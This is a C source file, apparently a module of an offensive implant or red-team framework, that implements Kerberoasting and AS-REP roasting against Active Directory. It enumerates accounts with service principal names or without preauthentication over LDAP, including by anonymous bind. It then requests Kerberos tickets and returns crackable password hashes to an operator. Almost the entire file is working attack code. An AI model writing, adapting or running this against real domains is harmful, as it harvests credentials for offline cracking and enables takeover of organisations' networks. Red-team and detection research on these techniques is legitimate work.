#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winldap.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "ark/krb5.h"
#include "ark/mod_util.h"
#include "ark/modules.h"
#include "ark/pb_modules.h"

#pragma comment(lib, "wldap32.lib")

#define ARK_KR_MAX_SPN 64

/* On failure, put a clear operator-facing string in *out so executor surfaces it (not "task handler failed"). */
static int fail_str(const char *msg, uint8_t **out, size_t *out_len) {
    if (!out || !out_len || !msg) return 0;
    size_t n = strlen(msg);
    uint8_t *buf = (uint8_t *)malloc(n + 1);
    if (!buf) return 0;
    memcpy(buf, msg, n + 1);
    *out = buf;
    *out_len = n;
    return 0;
}

int ark_mod_kerberoast(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    ark_kerberoast_config cfg;
    if (!ark_pb_decode_kerberoast_config(config, config_len, &cfg))
        return fail_str("kerberoast: invalid config protobuf", out, out_len);

    if (!cfg.domain[0] || !cfg.target_dc[0] || !cfg.username[0] || !cfg.password[0]) {
        ark_pb_free_kerberoast_config(&cfg);
        return fail_str("kerberoast: domain, target_dc, username, and password required", out, out_len);
    }

    char spn_storage[ARK_KR_MAX_SPN][ARK_KRB_SPN_MAX];
    char sam_storage[ARK_KR_MAX_SPN][ARK_KRB_SAM_MAX];
    const char *spn_ptrs[ARK_KR_MAX_SPN];
    const char *sam_ptrs[ARK_KR_MAX_SPN];
    size_t spn_count = 0;

    if (cfg.target_spn_count > 0) {
        for (size_t i = 0; i < cfg.target_spn_count && i < ARK_KR_MAX_SPN; i++) {
            strncpy(spn_storage[i], cfg.target_spns[i], ARK_KRB_SPN_MAX - 1);
            spn_storage[i][ARK_KRB_SPN_MAX - 1] = '\0';
            sam_storage[i][0] = '\0';
            spn_ptrs[i] = spn_storage[i];
            sam_ptrs[i] = sam_storage[i];
            spn_count++;
        }
    } else {
        LDAP *ld = ldap_init((PCHAR)cfg.target_dc, 389);
        if (!ld) {
            ark_pb_free_kerberoast_config(&cfg);
            return fail_str("kerberoast: ldap_init failed (DC unreachable?)", out, out_len);
        }
        ULONG version = LDAP_VERSION3;
        ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
        char bind[512];
        snprintf(bind, sizeof(bind), "%s@%s", cfg.username, cfg.domain);
        if (ldap_bind_s(ld, bind, (PCHAR)cfg.password, LDAP_AUTH_SIMPLE) != LDAP_SUCCESS) {
            ldap_unbind(ld);
            ark_pb_free_kerberoast_config(&cfg);
            return fail_str("kerberoast: LDAP bind failed (bad creds or simple bind denied)", out, out_len);
        }
        char base[512];
        ark_mod_domain_to_base_dn(cfg.domain, base, sizeof(base));
        char *attrs[] = { "sAMAccountName", "servicePrincipalName", NULL };
        const char *filter =
            "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
        LDAPMessage *res = NULL;
        if (ldap_search_s(ld, base, LDAP_SCOPE_SUBTREE, (PCHAR)filter, attrs, 0, &res) != LDAP_SUCCESS) {
            ldap_unbind(ld);
            ark_pb_free_kerberoast_config(&cfg);
            return fail_str("kerberoast: LDAP SPN search failed", out, out_len);
        }
        for (LDAPMessage *entry = ldap_first_entry(ld, res);
             entry && spn_count < ARK_KR_MAX_SPN;
             entry = ldap_next_entry(ld, entry)) {
            PCHAR *sams = ldap_get_values(ld, entry, "sAMAccountName");
            PCHAR *spns = ldap_get_values(ld, entry, "servicePrincipalName");
            const char *sam = (sams && sams[0]) ? sams[0] : "";
            if (spns) {
                for (int i = 0; spns[i] && spn_count < ARK_KR_MAX_SPN; i++) {
                    strncpy(spn_storage[spn_count], spns[i], ARK_KRB_SPN_MAX - 1);
                    spn_storage[spn_count][ARK_KRB_SPN_MAX - 1] = '\0';
                    strncpy(sam_storage[spn_count], sam, ARK_KRB_SAM_MAX - 1);
                    sam_storage[spn_count][ARK_KRB_SAM_MAX - 1] = '\0';
                    spn_ptrs[spn_count] = spn_storage[spn_count];
                    sam_ptrs[spn_count] = sam_storage[spn_count];
                    spn_count++;
                }
            }
            if (sams) ldap_value_free(sams);
            if (spns) ldap_value_free(spns);
        }
        ldap_msgfree(res);
        ldap_unbind(ld);
    }

    /* Zero SPNs is a valid empty result (no placeholder hashes). */
    if (spn_count == 0) {
        int ok = ark_pb_encode_kerberoast_result_multi(NULL, 0, out, out_len);
        ark_pb_free_kerberoast_config(&cfg);
        if (!ok) return fail_str("kerberoast: encode empty result failed", out, out_len);
        return 1;
    }

    ark_krb_hash hashes[ARK_KR_MAX_SPN];
    size_t hash_count = 0;
    if (!ark_krb_kerberoast(cfg.target_dc, cfg.domain, cfg.username, cfg.password,
            spn_ptrs, sam_ptrs, spn_count, hashes, ARK_KR_MAX_SPN, &hash_count)) {
        ark_pb_free_kerberoast_config(&cfg);
        return fail_str("kerberoast: AS-REQ/TGS failed (bad password, clock skew, or DC:88 blocked) — no placeholder hashes", out, out_len);
    }

    ark_kerberoast_hash pb_hashes[ARK_KR_MAX_SPN];
    for (size_t i = 0; i < hash_count; i++) {
        pb_hashes[i].spn = hashes[i].spn;
        pb_hashes[i].sam = hashes[i].sam;
        pb_hashes[i].hash = hashes[i].hash;
        pb_hashes[i].enc = hashes[i].enc;
    }

    int ok = ark_pb_encode_kerberoast_result_multi(pb_hashes, hash_count, out, out_len);
    ark_pb_free_kerberoast_config(&cfg);
    if (!ok) return fail_str("kerberoast: encode result failed", out, out_len);
    return 1;
}

#define ARK_AR_MAX_USER 64

int ark_mod_asreproast(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    ark_asreproast_config cfg;
    if (!ark_pb_decode_asreproast_config(config, config_len, &cfg))
        return fail_str("asreproast: invalid config protobuf", out, out_len);

    if (!cfg.domain[0] || !cfg.target_dc[0]) {
        ark_pb_free_asreproast_config(&cfg);
        return fail_str("asreproast: domain and target_dc required", out, out_len);
    }

    char user_storage[ARK_AR_MAX_USER][ARK_KRB_SAM_MAX];
    const char *user_ptrs[ARK_AR_MAX_USER];
    size_t user_count = 0;

    if (cfg.target_user_count > 0) {
        for (size_t i = 0; i < cfg.target_user_count && i < ARK_AR_MAX_USER; i++) {
            if (!cfg.target_users[i] || !cfg.target_users[i][0]) continue;
            strncpy(user_storage[user_count], cfg.target_users[i], ARK_KRB_SAM_MAX - 1);
            user_storage[user_count][ARK_KRB_SAM_MAX - 1] = '\0';
            user_ptrs[user_count] = user_storage[user_count];
            user_count++;
        }
    } else {
        /* Enumerate DONT_REQ_PREAUTH (UAC 0x400000) via anonymous/simple LDAP if possible.
         * No credentials in ASREPRoastConfig — try unauthenticated bind. */
        LDAP *ld = ldap_init((PCHAR)cfg.target_dc, 389);
        if (!ld) {
            ark_pb_free_asreproast_config(&cfg);
            return fail_str("asreproast: ldap_init failed — pass target_users if LDAP enum unavailable", out, out_len);
        }
        ULONG version = LDAP_VERSION3;
        ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
        /* Anonymous bind — many labs allow read of UAC; if not, operator must pass target_users. */
        if (ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_SIMPLE) != LDAP_SUCCESS) {
            ldap_unbind(ld);
            ark_pb_free_asreproast_config(&cfg);
            return fail_str("asreproast: anonymous LDAP bind denied — pass target_users explicitly", out, out_len);
        }
        char base[512];
        ark_mod_domain_to_base_dn(cfg.domain, base, sizeof(base));
        char *attrs[] = { "sAMAccountName", NULL };
        const char *filter =
            "(&(objectCategory=person)(objectClass=user)"
            "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
        LDAPMessage *res = NULL;
        if (ldap_search_s(ld, base, LDAP_SCOPE_SUBTREE, (PCHAR)filter, attrs, 0, &res) != LDAP_SUCCESS) {
            ldap_unbind(ld);
            ark_pb_free_asreproast_config(&cfg);
            return fail_str("asreproast: LDAP search failed — pass target_users", out, out_len);
        }
        for (LDAPMessage *entry = ldap_first_entry(ld, res);
             entry && user_count < ARK_AR_MAX_USER;
             entry = ldap_next_entry(ld, entry)) {
            PCHAR *sams = ldap_get_values(ld, entry, "sAMAccountName");
            if (sams && sams[0]) {
                strncpy(user_storage[user_count], sams[0], ARK_KRB_SAM_MAX - 1);
                user_storage[user_count][ARK_KRB_SAM_MAX - 1] = '\0';
                user_ptrs[user_count] = user_storage[user_count];
                user_count++;
            }
            if (sams) ldap_value_free(sams);
        }
        ldap_msgfree(res);
        ldap_unbind(ld);
    }

    if (user_count == 0) {
        /* Empty result is valid (no roastable users) — not a hard fail. */
        int ok = ark_pb_encode_asreproast_result_multi(NULL, 0, out, out_len);
        ark_pb_free_asreproast_config(&cfg);
        return ok;
    }

    ark_krb_hash hashes[ARK_AR_MAX_USER];
    size_t hash_count = 0;
    if (!ark_krb_asreproast(cfg.target_dc, cfg.domain, user_ptrs, user_count,
            hashes, ARK_AR_MAX_USER, &hash_count)) {
        ark_pb_free_asreproast_config(&cfg);
        return fail_str("asreproast: AS-REQ failed (no preauth) — no placeholder hashes", out, out_len);
    }

    ark_asreproast_hash pb_hashes[ARK_AR_MAX_USER];
    for (size_t i = 0; i < hash_count; i++) {
        pb_hashes[i].username = hashes[i].sam;
        pb_hashes[i].hash = hashes[i].hash;
    }

    int ok = ark_pb_encode_asreproast_result_multi(pb_hashes, hash_count, out, out_len);
    ark_pb_free_asreproast_config(&cfg);
    if (!ok) return fail_str("asreproast: encode result failed", out, out_len);
    return 1;
}
